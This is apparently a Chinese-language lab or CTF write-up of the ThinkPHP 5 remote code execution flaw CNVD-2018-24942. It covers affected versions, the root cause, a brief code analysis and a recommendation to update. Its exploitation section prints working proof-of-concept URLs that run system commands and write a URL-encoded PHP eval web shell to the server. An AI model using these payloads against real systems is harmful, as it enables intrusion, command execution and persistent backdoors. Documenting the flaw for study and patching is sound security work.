thinkphp-cnvd_2018_24942

# 前置知识

 ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级**PHP开发框架**，是为了**敏捷WEB应用开发**和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。

# 影响版本

ThinkPHP 5.*，<5.1.31

ThinkPHP <=5.0.23

# 漏洞原理

ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击。

# 漏洞利用

1、访问页面

![image-20200824233505828](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200824233505828.png)

2、构造路径与参数

```
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /tmp
```

3、拿到flag

![image-20200824233524903](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200824233524903.png)

4、POC

/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100

/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd

/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=getshell.php&vars[1][]=%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%6c%6f%72%64%73%6b%79%27%5d%29%3b%20%3f%3e

# 漏洞分析

1、thinkphp目录结构

```
├─thinkphp              框架系统目录
│  ├─lang               语言文件目录
│  ├─library            框架类库目录
│  │  ├─think           Think类库包目录
│  │  └─traits          系统Trait目录
│  │
│  ├─tpl                系统模板目录
│  ├─base.php           基础定义文件
│  ├─convention.php     框架惯例配置文件
│  ├─helper.php         助手函数文件
│  └─logo.png           框架LOGO文件
```

2、Web入口

library/think/App.php

该漏洞主要因为php代码中route/dispatch模块没有对URL中的恶意命令进行过滤导致，在没有开启强制路由的情况下，能够造成远程命令执行，包括执行shell命令，调用php函数，写入webshell等。

# 修复建议

更新框架